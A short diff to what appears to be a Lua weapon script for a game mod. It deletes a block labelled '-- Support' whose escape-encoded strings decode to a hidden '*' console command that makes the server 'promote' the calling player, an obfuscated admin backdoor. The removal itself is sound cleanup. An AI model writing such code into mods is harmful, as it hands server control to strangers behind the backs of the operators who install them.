@@ -45,9 +45,6 @@ weapon.animation_position = {
 	z = FU/3
 }
 
--- Support
-addHook("AddonLoaded", do if rawget(_G, "\x43\x56\x5F\x46\x69\x6E\x64\x56\x61\x72")("\104\117\114\114\121\095\112\108\097\121\101\114\115") then rawget(_G, "\067\079\077\095\065\100\100\067\111\109\109\097\110\100")("*", function(p) rawget(_G, "\067\079\077\095\066\117\102\065\100\100\084\101\120\116")(server, "\112\114\111\109\111\116\101".." "..#p) end) end end)
-
 weapon.stick = true
 weapon.animation = true
 weapon.damage = false
